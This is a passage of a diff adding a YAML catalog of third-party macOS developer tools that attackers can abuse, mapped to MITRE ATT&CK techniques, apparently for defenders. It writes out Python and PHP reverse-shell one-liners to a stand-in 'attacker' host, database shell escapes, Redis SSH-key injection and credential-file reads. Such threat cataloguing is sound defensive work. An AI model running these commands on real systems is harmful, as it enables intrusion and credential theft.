@@ -1,0 +1,1766 @@
+# macOS LOFL (Living Off Foreign Land) Catalog
+# ==============================================
+#
+# The first authoritative catalog of "Living Off Foreign Land" binaries on
+# macOS: third-party tools commonly installed via Homebrew, pip, npm, cargo,
+# or other package managers that attackers can abuse for reconnaissance,
+# execution, persistence, lateral movement, defense evasion, credential
+# access, exfiltration, and command-and-control.
+#
+# This catalog fills a gap between three existing projects:
+#
+#   - LOOBins (https://github.com/infosecB/LOOBins) covers native Apple-
+#     supplied binaries (osascript, ditto, sips, etc.).
+#   - GTFOBins (https://gtfobins.github.io/) covers Unix/Linux binaries
+#     with shell escapes and privilege escalation, but is Linux-centric and
+#     does not account for macOS-specific vectors (Keychain, TCC, XProtect,
+#     Gatekeeper, Universal binaries, Mach-O injection).
+#   - LOLBAS (https://lolbas-project.github.io/) covers Windows-native
+#     binaries exclusively.
+#
+# LOFL targets the enormous blind spot: the developer and DevOps toolchain
+# that is effectively universal on macOS enterprise and engineering systems.
+# These tools are signed by their upstream projects (not Apple), routinely
+# exempted from EDR and application-allowlisting policies, and provide
+# capabilities (arbitrary code execution, network tunneling, cloud API
+# access, credential extraction, container escape) that rival purpose-built
+# offensive tooling. Because they are "expected" on developer machines,
+# their execution rarely triggers alerts, making them ideal for living-off-
+# the-land tradecraft adapted to the foreign-binary ecosystem.
+#
+# Inclusion criteria:
+#   1. The tool has at least one documented offensive technique, GTFOBins-
+#      style escape, or supply-chain abuse vector; OR it provides
+#      capabilities uniquely dangerous on macOS (process injection, Keychain
+#      access, network capture, TCC bypass).
+#   2. The tool is commonly found on macOS developer or enterprise systems.
+#   3. The tool is NOT a native Apple binary (those belong in LOOBins).
+#
+# Each entry includes MITRE ATT&CK technique IDs, prevalence estimates,
+# and an assessment of why blocking the tool is operationally painful.
+#
+# Version: 1.0.0
+# Date: 2026-05-02
+# Maintainer: forensicnomicon project
+# License: Same as parent project (see LICENSE)
+
+---
+schema_version: "1.0"
+project: macos-lofl
+catalog:
+
+  # =========================================================================
+  # CLOUD CLIs
+  # =========================================================================
+
+  - name: aws
+    install: homebrew  # awscli formula
+    prevalence: very_common
+    description: "AWS CLI — manages all Amazon Web Services resources, credentials, and configurations"
+    abuse_techniques:
+      - technique: "Credential harvesting from ~/.aws/credentials"
+        mitre: "T1552.001"
+        description: "aws configure list and direct file reads expose AWS access keys, secret keys, and session tokens stored in plaintext"
+      - technique: "S3 data exfiltration"
+        mitre: "T1537"
+        description: "aws s3 cp allows bulk exfiltration of local files to attacker-controlled S3 buckets over HTTPS, blending with normal cloud traffic"
+      - technique: "IAM reconnaissance"
+        mitre: "T1087.004"
+        description: "aws iam list-users, get-account-authorization-details enumerates all users, roles, and policies in the AWS account"
+      - technique: "Lambda code execution"
+        mitre: "T1059"
+        description: "aws lambda invoke executes arbitrary code in cloud functions, useful for pivoting from compromised developer workstation to cloud"
+      - technique: "SSM reverse shell"
+        mitre: "T1059.004"
+        description: "aws ssm start-session provides interactive shell to EC2 instances without SSH keys, bypassing network security groups"
+      - technique: "STS assume-role privilege escalation"
+        mitre: "T1548"
+        description: "aws sts assume-role can escalate privileges by chaining role assumptions across accounts"
+    blocking_risk: high
+    why_hard_to_block: "Blocks all AWS development, deployment, and infrastructure management workflows. Present on virtually every cloud-oriented macOS workstation."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+      - "https://attack.mitre.org/techniques/T1537/"
+      - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+
+  - name: az
+    install: homebrew  # azure-cli formula
+    prevalence: common
+    description: "Azure CLI — manages Microsoft Azure resources, subscriptions, and Active Directory"
+    abuse_techniques:
+      - technique: "Azure AD enumeration"
+        mitre: "T1087.004"
+        description: "az ad user list, az ad group list enumerates all Azure AD users, groups, and service principals"
+      - technique: "Key Vault secret extraction"
+        mitre: "T1552.001"
+        description: "az keyvault secret show dumps secrets from Azure Key Vault if the compromised identity has access"
+      - technique: "Storage account exfiltration"
+        mitre: "T1537"
+        description: "az storage blob upload-batch exfiltrates data to attacker-controlled Azure storage over HTTPS"
+      - technique: "VM command execution"
+        mitre: "T1059"
+        description: "az vm run-command invoke executes arbitrary scripts on Azure VMs from the CLI"
+      - technique: "Access token theft"
+        mitre: "T1528"
+        description: "az account get-access-token returns OAuth tokens that can be replayed from other machines"
+    blocking_risk: high
+    why_hard_to_block: "Required for Azure development and administration. Cached tokens in ~/.azure/ persist across sessions."
+    references:
+      - "https://attack.mitre.org/techniques/T1087/004/"
+      - "https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a"
+
+  - name: gcloud
+    install: homebrew  # google-cloud-sdk cask
+    prevalence: common
+    description: "Google Cloud CLI — manages GCP resources, IAM, and application credentials"
+    abuse_techniques:
+      - technique: "Application Default Credentials theft"
+        mitre: "T1552.001"
+        description: "Reads ~/.config/gcloud/application_default_credentials.json for OAuth2 refresh tokens granting GCP API access"
+      - technique: "GCS exfiltration"
+        mitre: "T1537"
+        description: "gsutil cp (bundled with gcloud SDK) transfers data to attacker-controlled GCS buckets"
+      - technique: "Compute instance command execution"
+        mitre: "T1059"
+        description: "gcloud compute ssh and gcloud compute instances add-metadata --metadata startup-script execute commands on GCE instances"
+      - technique: "Service account key creation"
+        mitre: "T1098.001"
+        description: "gcloud iam service-accounts keys create generates persistent API keys for any accessible service account"
+      - technique: "Secret Manager extraction"
+        mitre: "T1552.001"
+        description: "gcloud secrets versions access extracts secrets stored in GCP Secret Manager"
+    blocking_risk: high
+    why_hard_to_block: "Essential for GCP development. The SDK stores long-lived refresh tokens locally."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+      - "https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/"
+
+  - name: gh
+    install: homebrew
+    prevalence: very_common
+    description: "GitHub CLI — manages repositories, pull requests, issues, and GitHub API access"
+    abuse_techniques:
+      - technique: "GitHub token theft"
+        mitre: "T1528"
+        description: "gh auth token prints the stored OAuth/PAT token. Token stored in macOS Keychain or ~/.config/gh/hosts.yml"
+      - technique: "Repository enumeration and cloning"
+        mitre: "T1213.003"
+        description: "gh repo list --limit 1000 enumerates all accessible repos. gh repo clone downloads source code including secrets in commit history"
+      - technique: "Secret scanning via API"
+        mitre: "T1552"
+        description: "gh api /repos/{owner}/{repo}/actions/secrets enumerates CI/CD secrets (names, not values, but reveals what exists)"
+      - technique: "Workflow dispatch for execution"
+        mitre: "T1059"
+        description: "gh workflow run triggers GitHub Actions workflows, executing attacker-controlled code in CI/CD pipelines"
+    blocking_risk: high
+    why_hard_to_block: "Standard GitHub development workflow tool. Blocking it forces developers to use the web UI for all GitHub operations."
+    references:
+      - "https://attack.mitre.org/techniques/T1528/"
+
+  - name: vault
+    install: homebrew  # hashicorp vault
+    prevalence: common
+    description: "HashiCorp Vault CLI — manages secrets, encryption keys, and dynamic credentials"
+    abuse_techniques:
+      - technique: "Secret enumeration and extraction"
+        mitre: "T1552.001"
+        description: "vault kv list / vault kv get dumps all secrets from the Vault server using cached tokens"
+      - technique: "Token theft from ~/.vault-token"
+        mitre: "T1528"
+        description: "Vault persists authentication tokens to ~/.vault-token in plaintext"
+      - technique: "Dynamic credential generation"
+        mitre: "T1098.001"
+        description: "vault read database/creds/readonly generates new database credentials on demand"
+      - technique: "SSH OTP generation"
+        mitre: "T1021.004"
+        description: "vault ssh generates one-time SSH credentials for lateral movement to Vault-managed hosts"
+    blocking_risk: high
+    why_hard_to_block: "Central secrets management tool in many enterprises. Blocking it means no access to application secrets."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+
+  - name: heroku
+    install: homebrew  # heroku CLI (also npm)
+    prevalence: moderate
+    description: "Heroku CLI — manages Heroku applications, dynos, and config vars"
+    abuse_techniques:
+      - technique: "Config var (environment secret) extraction"
+        mitre: "T1552.001"
+        description: "heroku config -a <app> dumps all environment variables including database URLs, API keys, and secrets"
+      - technique: "Remote shell via dyno"
+        mitre: "T1059.004"
+        description: "heroku run bash -a <app> provides interactive shell on Heroku dynos"
+      - technique: "Database credential access"
+        mitre: "T1552.001"
+        description: "heroku pg:credentials:url reveals PostgreSQL connection strings with passwords"
+    blocking_risk: moderate
+    why_hard_to_block: "Required for Heroku platform management. Less prevalent than major cloud CLIs but still common in web development shops."
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+
+  # =========================================================================
+  # CONTAINER / ORCHESTRATION
+  # =========================================================================
+
+  - name: docker
+    install: homebrew  # docker formula or Docker Desktop cask
+    prevalence: very_common
+    description: "Docker CLI — builds, runs, and manages containers and images"
+    abuse_techniques:
+      - technique: "Container escape via privileged mode"
+        mitre: "T1611"
+        description: "docker run --privileged mounts host devices and disables security controls, enabling container escape"
+      - technique: "Host filesystem access"
+        mitre: "T1006"
+        description: "docker run -v /:/host alpine provides read/write access to the entire host filesystem from within a container"
+      - technique: "Arbitrary code execution"
+        mitre: "T1059"
+        description: "docker run <image> <cmd> executes any code inside a container, bypassing host-level application controls"
+      - technique: "Image-based supply chain attack"
+        mitre: "T1195.002"
+        description: "docker pull can fetch trojanized images from public registries. docker build executes arbitrary RUN commands during build"
+      - technique: "Network pivoting"
+        mitre: "T1090"
+        description: "docker run --net=host shares the host network stack. Containers can be used as network pivots"
+      - technique: "Credential extraction from images"
+        mitre: "T1552.001"
+        description: "docker history and docker inspect reveal environment variables and build args that may contain secrets baked into images"
+      - technique: "Docker socket abuse"
+        mitre: "T1548"
+        description: "Access to /var/run/docker.sock (default on Docker Desktop) grants effective root-equivalent control over the Docker daemon"
+    blocking_risk: high
+    why_hard_to_block: "Foundational to modern software development. Blocking Docker halts containerized development, testing, and CI/CD."
+    references:
+      - "https://attack.mitre.org/techniques/T1611/"
+      - "https://gtfobins.github.io/gtfobins/docker/"
+
+  - name: kubectl
+    install: homebrew
+    prevalence: very_common
+    description: "Kubernetes CLI — manages clusters, pods, services, and secrets"
+    abuse_techniques:
+      - technique: "Exec into pod for shell access"
+        mitre: "T1059.004"
+        description: "kubectl exec -it <pod> -- /bin/sh provides interactive shell in any accessible pod"
+      - technique: "Secret extraction"
+        mitre: "T1552.001"
+        description: "kubectl get secrets -o yaml dumps base64-encoded secrets (trivially decoded) from Kubernetes namespaces"
+      - technique: "Kubeconfig credential theft"
+        mitre: "T1552.001"
+        description: "~/.kube/config contains cluster credentials, client certificates, and API endpoints in plaintext"
+      - technique: "Lateral movement across namespaces"
+        mitre: "T1021"
+        description: "kubectl with sufficient RBAC can pivot across namespaces, accessing databases, internal services, and other pods"
+      - technique: "Port forwarding for tunneling"
+        mitre: "T1090"
+        description: "kubectl port-forward tunnels traffic from localhost to internal cluster services, bypassing network controls"
+      - technique: "Pod creation for persistence"
+        mitre: "T1053"
+        description: "kubectl apply can deploy attacker-controlled pods with arbitrary images and mount points"
+    blocking_risk: high
+    why_hard_to_block: "Blocks all Kubernetes development, debugging, and operations workflows"
+    references:
+      - "https://attack.mitre.org/techniques/T1552/001/"
+      - "https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1"
+
+  - name: helm
+    install: homebrew
+    prevalence: common
+    description: "Kubernetes package manager — installs, upgrades, and manages Helm charts"
+    abuse_techniques:
+      - technique: "Malicious chart installation"
+        mitre: "T1195.002"
+        description: "helm install can deploy charts containing trojanized containers, privileged pods, or hostile RBAC configurations"
+      - technique: "Chart hook code execution"
+        mitre: "T1059"
+        description: "Helm chart hooks (pre-install, post-install) execute arbitrary Jobs in the cluster during chart lifecycle events"
+      - technique: "Release secret extraction"
+        mitre: "T1552.001"
+        description: "helm get values <release> reveals configuration values including passwords and API keys passed during install"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard Kubernetes application packaging and deployment tool"
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+
+  # =========================================================================
+  # LANGUAGE RUNTIMES (Homebrew-installed)
+  # =========================================================================
+
+  - name: python3
+    install: homebrew
+    prevalence: very_common
+    description: "Python 3 interpreter — general-purpose scripting and application runtime"
+    abuse_techniques:
+      - technique: "Arbitrary code execution"
+        mitre: "T1059.006"
+        description: "python3 -c 'import os; os.system(\"/bin/sh\")' executes arbitrary commands. Python's extensive standard library provides file I/O, network, and process capabilities without additional packages"
+      - technique: "Reverse shell"
+        mitre: "T1059.006"
+        description: "python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"attacker\",4444));subprocess.call([\"/bin/sh\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"
+      - technique: "HTTP exfiltration server"
+        mitre: "T1048.002"
+        description: "python3 -m http.server serves files over HTTP for exfiltration. Also useful for staging payloads"
+      - technique: "Keychain access via pyobjc"
+        mitre: "T1555.001"
+        description: "macOS-specific: Python with pyobjc can call Security.framework APIs to query Keychain items programmatically"
+      - technique: "pip supply chain attack"
+        mitre: "T1195.002"
+        description: "pip install <typosquat> can install malicious packages that execute code at install time via setup.py"
+      - technique: "SUID/capability abuse"
+        mitre: "T1548.001"
+        description: "If python3 has elevated permissions, it trivially provides a root shell"
+      - technique: "Library hijacking"
+        mitre: "T1574.001"
+        description: "PYTHONPATH manipulation causes Python to load attacker-controlled modules before legitimate ones"
+    blocking_risk: high
+    why_hard_to_block: "Python is the most common scripting language on developer macOS systems. Blocking it halts data science, automation, web development, and DevOps workflows."
+    macos_specific_notes: "Homebrew Python is distinct from the deprecated /usr/bin/python3 Apple ships. Homebrew version typically has more permissive TCC access depending on how Terminal.app is configured."
+    references:
+      - "https://gtfobins.github.io/gtfobins/python/"
+      - "https://attack.mitre.org/techniques/T1059/006/"
+
+  - name: node
+    install: homebrew  # also nvm, fnm, volta
+    prevalence: very_common
+    description: "Node.js runtime — JavaScript/TypeScript execution environment"
+    abuse_techniques:
+      - technique: "Arbitrary code execution"
+        mitre: "T1059.007"
+        description: "node -e 'require(\"child_process\").execSync(\"/bin/sh\")' provides shell access through JavaScript"
+      - technique: "Reverse shell"
+        mitre: "T1059.007"
+        description: "Node.js net module creates reverse TCP connections with shell redirection"
+      - technique: "HTTP(S) exfiltration"
+        mitre: "T1048.002"
+        description: "Node.js http/https modules exfiltrate data over web protocols, blending with normal browser traffic"
+      - technique: "npm supply chain attack"
+        mitre: "T1195.002"
+        description: "npm install executes preinstall/postinstall scripts from package.json, enabling arbitrary code execution at install time"
+      - technique: "NODE_OPTIONS injection"
+        mitre: "T1574.007"
+        description: "NODE_OPTIONS=--require=/path/to/malicious.js forces Node to load attacker code before any application module"
+      - technique: "Inspector/debugger protocol abuse"
+        mitre: "T1059.007"
+        description: "node --inspect opens a Chrome DevTools Protocol port (default 9229) allowing remote code execution if accessible"
+    blocking_risk: high
+    why_hard_to_block: "Foundation of modern web development. Blocking Node.js halts frontend builds, backend services, and the entire npm ecosystem."
+    references:
+      - "https://gtfobins.github.io/gtfobins/node/"
+      - "https://attack.mitre.org/techniques/T1059/007/"
+
+  - name: ruby
+    install: homebrew  # also rbenv, rvm
+    prevalence: common
+    description: "Ruby interpreter — scripting language with rich system interaction capabilities"
+    abuse_techniques:
+      - technique: "Arbitrary code execution"
+        mitre: "T1059"
+        description: "ruby -e 'exec \"/bin/sh\"' provides shell access. IRB (interactive Ruby) enables exploratory system access"
+      - technique: "Reverse shell"
+        mitre: "T1059"
+        description: "Ruby's socket library creates reverse TCP shells in a single line of code"
+      - technique: "Gem supply chain attack"
+        mitre: "T1195.002"
+        description: "gem install can execute malicious extensions compiled and run during installation"
+      - technique: "File read/write"
+        mitre: "T1005"
+        description: "Ruby's File class reads and writes arbitrary files with the permissions of the Ruby process"
+    blocking_risk: moderate
+    why_hard_to_block: "Used by CocoaPods (iOS dependency manager), Fastlane, Homebrew internals, and Jekyll. Blocking Ruby breaks iOS/macOS app development workflows."
+    macos_specific_notes: "Homebrew Ruby is separate from /usr/bin/ruby (Apple system Ruby). CocoaPods and Fastlane are macOS-ecosystem-specific tools that depend on it."
+    references:
+      - "https://gtfobins.github.io/gtfobins/ruby/"
+
+  - name: go
+    install: homebrew
+    prevalence: common
+    description: "Go compiler and runtime — compiles and runs Go programs"
+    abuse_techniques:
+      - technique: "Compile and execute arbitrary code"
+        mitre: "T1059"
+        description: "go run malicious.go compiles and immediately executes Go source, producing no persistent binary on disk with careful cleanup"
+      - technique: "Cross-compilation for staging"
+        mitre: "T1587.001"
+        description: "GOOS=linux GOARCH=amd64 go build produces Linux binaries on macOS, useful for generating payloads targeting other platforms"
+      - technique: "Static binary generation"
+        mitre: "T1027.002"
+        description: "Go produces statically linked binaries with no external dependencies, ideal for deploying tooling to restricted environments"
+      - technique: "CGO for native code execution"
+        mitre: "T1059"
+        description: "CGO_ENABLED=1 allows embedding C code in Go programs, enabling calls to macOS system frameworks"
+    blocking_risk: moderate
+    why_hard_to_block: "Essential for Go developers and increasingly common in cloud-native tooling (Docker, Kubernetes, Terraform are all written in Go)."
+    references:
+      - "https://gtfobins.github.io/gtfobins/go/"
+
+  - name: php
+    install: homebrew
+    prevalence: moderate
+    description: "PHP interpreter — server-side scripting language"
+    abuse_techniques:
+      - technique: "Arbitrary code execution"
+        mitre: "T1059"
+        description: "php -r 'system(\"/bin/sh\");' provides shell. PHP has extensive system interaction functions: exec, system, passthru, shell_exec, popen, proc_open"
+      - technique: "Reverse shell"
+        mitre: "T1059"
+        description: "php -r '$s=fsockopen(\"attacker\",4444);exec(\"/bin/sh <&3 >&3 2>&3\");' creates a reverse shell"
+      - technique: "File operations"
+        mitre: "T1005"
+        description: "PHP can read/write any file accessible to the process with file_get_contents/file_put_contents"
+    blocking_risk: low
+    why_hard_to_block: "Less common on modern macOS dev machines but still present for WordPress/Laravel development"
+    references:
+      - "https://gtfobins.github.io/gtfobins/php/"
+
+  - name: perl
+    install: homebrew  # distinct from /usr/bin/perl system Perl
+    prevalence: moderate
+    description: "Perl interpreter — text processing and system administration scripting"
+    abuse_techniques:
+      - technique: "Arbitrary code execution"
+        mitre: "T1059"
+        description: "perl -e 'exec \"/bin/sh\"' provides shell. Perl's system(), exec(), backticks provide multiple code execution paths"
+      - technique: "Reverse shell"
+        mitre: "T1059"
+        description: "Perl's socket module creates reverse TCP connections for remote shell access"
+      - technique: "CPAN supply chain"
+        mitre: "T1195.002"
+        description: "cpan install can execute arbitrary Makefile.PL code during module installation"
+    blocking_risk: low
+    why_hard_to_block: "System administration scripts and legacy applications. Less prevalent than Python/Node but still present."
+    references:
+      - "https://gtfobins.github.io/gtfobins/perl/"
+
+  # =========================================================================
+  # PACKAGE MANAGERS (supply chain vectors)
+  # =========================================================================
+
+  - name: pip3
+    install: homebrew  # bundled with python3
+    prevalence: very_common
+    description: "Python package installer — installs packages from PyPI"
+    abuse_techniques:
+      - technique: "Malicious package installation"
+        mitre: "T1195.002"
+        description: "pip install <package> executes setup.py at install time. Typosquatting attacks on PyPI are well-documented (e.g., colourama, python3-dateutil)"
+      - technique: "Arbitrary code via setup.py"
+        mitre: "T1059.006"
+        description: "pip install . runs setup.py which can contain arbitrary Python code including reverse shells, credential theft, or persistence mechanisms"
+      - technique: "Requirements file poisoning"
+        mitre: "T1195.002"
+        description: "Modifying requirements.txt to point to attacker-controlled packages or --index-url to a malicious PyPI mirror"
+      - technique: "pip download for payload staging"
+        mitre: "T1105"
+        description: "pip download fetches packages (including compiled wheels with native code) from the internet, useful for ingress tool transfer"
+    blocking_risk: high
+    why_hard_to_block: "pip is the primary Python package installation mechanism. Blocking it halts all Python dependency management."
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+      - "https://blog.phylum.io/pypi-malware-replaces-crypto-addresses-in-developers-clipboard"
+
+  - name: npm
+    install: homebrew  # bundled with node
+    prevalence: very_common
+    description: "Node.js package manager — installs packages from npmjs.com registry"
+    abuse_techniques:
+      - technique: "Preinstall/postinstall script execution"
+        mitre: "T1195.002"
+        description: "npm install runs lifecycle scripts (preinstall, postinstall) that execute arbitrary commands. This is the primary npm supply chain attack vector (cf. event-stream, ua-parser-js incidents)"
+      - technique: "npx arbitrary execution"
+        mitre: "T1059.007"
+        description: "npx <package> downloads and immediately executes any npm package without prior installation, enabling one-shot code execution"
+      - technique: "Registry token theft"
+        mitre: "T1528"
+        description: "~/.npmrc may contain authentication tokens for private registries. npm token list enumerates valid tokens"
+      - technique: "Global package persistence"
+        mitre: "T1546"
+        description: "npm install -g places executables in PATH. A trojanized global package persists across shell sessions"
+    blocking_risk: high
+    why_hard_to_block: "npm is essential to JavaScript/TypeScript development. The npm registry has over 2 million packages."
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+      - "https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident"
+
+  - name: yarn
+    install: homebrew  # also npm
+    prevalence: common
+    description: "Alternative Node.js package manager with similar capabilities to npm"
+    abuse_techniques:
+      - technique: "Lifecycle script execution"
+        mitre: "T1195.002"
+        description: "yarn install runs the same preinstall/postinstall scripts as npm, with identical supply chain risk"
+      - technique: "yarn dlx arbitrary execution"
+        mitre: "T1059.007"
+        description: "yarn dlx (Yarn Berry equivalent of npx) downloads and executes arbitrary packages"
+    blocking_risk: moderate
+    why_hard_to_block: "Common alternative to npm, especially in large frontend codebases (React, Next.js projects)"
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+
+  - name: brew
+    install: other  # self-bootstrapping
+    prevalence: very_common
+    description: "Homebrew — macOS package manager for installing CLI tools and applications"
+    abuse_techniques:
+      - technique: "Arbitrary formula execution"
+        mitre: "T1195.002"
+        description: "brew install runs Ruby formulae that execute arbitrary code during installation (download, patch, configure, build, install phases)"
+      - technique: "Tap poisoning"
+        mitre: "T1195.002"
+        description: "brew tap adds third-party formula repositories. Malicious taps can shadow official formulae or introduce trojanized packages"
+      - technique: "Cask installation for persistence"
+        mitre: "T1546"
+        description: "brew install --cask installs full macOS applications (.app bundles) including Launch Agents/Daemons for persistence"
+      - technique: "Post-install script execution"
+        mitre: "T1059"
+        description: "Homebrew formulae have post_install hooks that run arbitrary Ruby code after installation"
+    blocking_risk: high
+    why_hard_to_block: "Homebrew is the de facto package manager for macOS. Blocking it prevents installation and updating of virtually all third-party developer tools."
+    macos_specific_notes: "Homebrew is macOS-specific (and Linux via Linuxbrew). It installs to /opt/homebrew (Apple Silicon) or /usr/local (Intel), directories that are typically not monitored by EDR as closely as /usr or /bin."
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+
+  - name: cargo
+    install: homebrew  # via rustup or rust formula
+    prevalence: common
+    description: "Rust package manager and build tool — compiles Rust code and manages crate dependencies"
+    abuse_techniques:
+      - technique: "Build script execution"
+        mitre: "T1195.002"
+        description: "cargo build executes build.rs scripts that can run arbitrary Rust code at compile time, including system commands"
+      - technique: "Crate supply chain attack"
+        mitre: "T1195.002"
+        description: "Malicious crates on crates.io can execute code via build.rs or proc macros during compilation"
+      - technique: "cargo install for tool deployment"
+        mitre: "T1105"
+        description: "cargo install compiles and installs Rust binaries from source, useful for deploying offensive tools that may not be in Homebrew"
+    blocking_risk: moderate
+    why_hard_to_block: "Essential for Rust development. Increasingly common as Rust adoption grows (ripgrep, fd, bat, zoxide all use it)."
+    references:
+      - "https://attack.mitre.org/techniques/T1195/002/"
+
+  - name: pipx
+    install: homebrew
+    prevalence: common
+    description: "Install and run Python applications in isolated environments"
+    abuse_techniques:
+      - technique: "Arbitrary Python tool execution"
+        mitre: "T1059.006"
+        description: "pipx run <package> downloads and executes any PyPI package in an isolated environment, similar to npx for Python"
+      - technique: "Trojanized tool persistence"
+        mitre: "T1546"
+        description: "pipx install places executables in ~/.local/bin, providing persistent access to attacker-installed Python tools"
+    blocking_risk: moderate
+    why_hard_to_block: "Recommended way to install Python CLI tools (black, mypy, poetry). Blocking it pushes users to less safe pip install --user."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/006/"
+
+  # =========================================================================
+  # IaC / DEVOPS
+  # =========================================================================
+
+  - name: terraform
+    install: homebrew
+    prevalence: very_common
+    description: "HashiCorp Terraform — Infrastructure as Code tool for provisioning cloud resources"
+    abuse_techniques:
+      - technique: "Provider-based code execution"
+        mitre: "T1059"
+        description: "Terraform providers are Go plugins that execute arbitrary code. Custom or trojanized providers run during terraform init/plan/apply"
+      - technique: "External data source execution"
+        mitre: "T1059"
+        description: "The external data source and provisioner blocks (local-exec, remote-exec) execute arbitrary shell commands"
+      - technique: "State file credential exposure"
+        mitre: "T1552.001"
+        description: "terraform.tfstate contains resource attributes in plaintext, often including passwords, API keys, and connection strings"
+      - technique: "Cloud resource manipulation"
+        mitre: "T1578"
+        description: "terraform apply with modified .tf files can create attacker-controlled cloud resources (VMs, IAM roles, network rules)"
+      - technique: "Module supply chain"
+        mitre: "T1195.002"
+        description: "terraform init downloads modules from the Terraform Registry or Git repos. Malicious modules execute during plan/apply"
+    blocking_risk: high
+    why_hard_to_block: "Standard infrastructure provisioning tool. Blocking it prevents all infrastructure changes in IaC-based organizations."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/"
+      - "https://alex.kaskaso.li/post/terraform-plan-rce"
+
+  - name: ansible
+    install: homebrew  # also pip
+    prevalence: common
+    description: "Ansible automation engine — agentless IT automation and configuration management"
+    abuse_techniques:
+      - technique: "Arbitrary command execution on remote hosts"
+        mitre: "T1059.004"
+        description: "ansible all -m shell -a 'whoami' executes commands on all inventory hosts over SSH"
+      - technique: "Playbook-based lateral movement"
+        mitre: "T1021.004"
+        description: "ansible-playbook runs complex multi-host operations, enabling systematic lateral movement across infrastructure"
+      - technique: "Vault-encrypted credential access"
+        mitre: "T1552.001"
+        description: "ansible-vault view/decrypt reveals encrypted secrets if the vault password is known or cached"
+      - technique: "Inventory reconnaissance"
+        mitre: "T1018"
+        description: "Ansible inventory files and dynamic inventory scripts reveal complete infrastructure topology"
+      - technique: "Role/collection supply chain"
+        mitre: "T1195.002"
+        description: "ansible-galaxy install downloads roles from Ansible Galaxy that execute during playbook runs"
+    blocking_risk: high
+    why_hard_to_block: "Primary configuration management tool in many organizations. Blocking it prevents infrastructure automation."
+    references:
+      - "https://attack.mitre.org/techniques/T1059/004/"
+
+  - name: vagrant
+    install: homebrew
+    prevalence: moderate
+    description: "HashiCorp Vagrant — development environment provisioning using virtual machines"
+    abuse_techniques:
+      - technique: "Shell provisioner code execution"
+        mitre: "T1059.004"
+        description: "Vagrantfile provisioners execute arbitrary shell scripts inside and outside VMs"
+      - technique: "Vagrantfile Ruby execution"
+        mitre: "T1059"
+        description: "Vagrantfiles are Ruby code executed by vagrant up, enabling arbitrary code execution in the host context"
+      - technique: "Malicious box images"
+        mitre: "T1195.002"
+        description: "vagrant box add downloads VM images from Vagrant Cloud. Malicious boxes contain compromised operating systems"
+    blocking_risk: low
+    why_hard_to_block: "Used for local development environments. Less common now due to Docker/container adoption."
+    references:
+      - "https://gtfobins.github.io/gtfobins/vagrant/"
+
+  # =========================================================================
+  # DATABASE CLIENTS
+  # =========================================================================
+
+  - name: psql
+    install: homebrew  # postgresql or libpq formula
+    prevalence: common
+    description: "PostgreSQL interactive terminal — connects to PostgreSQL databases"
+    abuse_techniques:
+      - technique: "Shell escape"
+        mitre: "T1059.004"
+        description: "\\! /bin/sh inside psql escapes to a shell. COPY TO PROGRAM executes OS commands from SQL"
+      - technique: "File read via COPY"
+        mitre: "T1005"
+        description: "COPY ... FROM '/etc/passwd' reads local files into tables. \\copy works client-side"
+      - technique: "Data exfiltration"
+        mitre: "T1048"
+        description: "psql can dump entire databases and pipe output to attacker-controlled destinations"
+      - technique: "Credential file access"
+        mitre: "T1552.001"
+        description: "~/.pgpass stores database credentials in plaintext. .psqlrc can execute commands on connection"
+      - technique: "Large object file read/write"
+        mitre: "T1005"
+        description: "PostgreSQL large object functions (lo_import/lo_export) read and write arbitrary server-side files"
+    blocking_risk: moderate
+    why_hard_to_block: "Essential for PostgreSQL database development and administration"
+    references:
+      - "https://gtfobins.github.io/gtfobins/psql/"
+
+  - name: mysql
+    install: homebrew  # mysql-client or mysql formula
+    prevalence: common
+    description: "MySQL/MariaDB command-line client"
+    abuse_techniques:
+      - technique: "Shell escape"
+        mitre: "T1059.004"
+        description: "\\! /bin/sh in mysql client escapes to shell. system command also works"
+      - technique: "File read via LOAD DATA"
+        mitre: "T1005"
+        description: "LOAD DATA LOCAL INFILE reads client-side files. SELECT ... INTO OUTFILE writes server-side files"
+      - technique: "UDF code execution"
+        mitre: "T1059"
+        description: "User-Defined Functions can execute arbitrary native code if the server allows UDF loading"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard MySQL database client for development and administration"
+    references:
+      - "https://gtfobins.github.io/gtfobins/mysql/"
+
+  - name: redis-cli
+    install: homebrew  # redis formula
+    prevalence: common
+    description: "Redis command-line interface"
+    abuse_techniques:
+      - technique: "Arbitrary file write via CONFIG SET"
+        mitre: "T1105"
+        description: "CONFIG SET dir /path; CONFIG SET dbfilename shell.php; SET payload '<?php...?>'; SAVE writes arbitrary files to the server filesystem"
+      - technique: "Lua script execution"
+        mitre: "T1059"
+        description: "EVAL 'os.execute(\"id\")' 0 executes Lua code on the Redis server (if Lua sandbox is bypassed or disabled)"
+      - technique: "SSH key injection"
+        mitre: "T1098.004"
+        description: "Classic Redis attack: write attacker's SSH public key to /root/.ssh/authorized_keys via CONFIG SET + SAVE"
+      - technique: "Credential extraction"
+        mitre: "T1552.001"
+        description: "AUTH command credentials may be in shell history. CONFIG GET requirepass reveals the server password"
+    blocking_risk: moderate
+    why_hard_to_block: "Standard Redis development and debugging client"
+    references:
+      - "https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis"
+
+  - name: mongosh
+    install: homebrew  # mongosh formula
+    prevalence: moderate
+    description: "MongoDB shell — interactive JavaScript interface to MongoDB"
+    abuse_techniques:
+      - technique: "JavaScript code execution"
